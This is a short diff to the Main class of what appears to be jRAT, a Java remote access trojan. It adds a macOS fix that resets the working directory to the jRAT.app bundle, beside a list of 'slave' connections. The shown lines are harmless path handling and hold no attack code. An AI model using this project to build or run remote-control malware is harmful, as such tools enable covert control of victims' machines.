@@ -39,7 +39,11 @@ public class Main {
 	public static final List<AbstractSlave> connections = new ArrayList<AbstractSlave>();
 	public static Frame instance;
 
-	public static void main(String[] args) throws Exception {	
+	public static void main(String[] args) throws Exception {					
+		if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX && System.getProperty("user.dir").contains("jRAT.app")) {
+			System.setProperty("user.dir", System.getProperty("user.dir").split("jRAT.app")[0] + "/jRAT.app");
+		}
+		
 		if (argsContains(args, "-locinfo")) {
 			System.out.println(System.getProperty("user.dir"));
 			System.out.println("jRAT.app: " + new File("jRAT.app/").exists());
